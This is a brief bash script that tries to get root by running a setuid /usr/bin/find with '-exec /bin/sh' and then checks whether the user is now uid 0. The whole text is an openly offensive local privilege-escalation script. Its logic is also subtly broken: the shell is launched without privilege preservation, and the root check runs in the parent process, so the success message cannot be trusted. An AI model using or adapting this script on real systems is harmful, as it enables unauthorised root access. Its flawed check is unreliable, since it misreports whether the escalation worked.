#!/bin/bash

setuid_binary="/usr/bin/find"

if [ ! -f "$setuid_binary" ]; then
    echo "Setuid binary not found: $setuid_binary"
    exit 1
fi

echo "Attempting to gain root access using $setuid_binary..."
"$setuid_binary" -exec /bin/sh \;

if [ "$(id -u)" -eq 0 ]; then
    echo "Successfully gained root access! You are now root."
else
    echo "Failed to gain root access."
fi
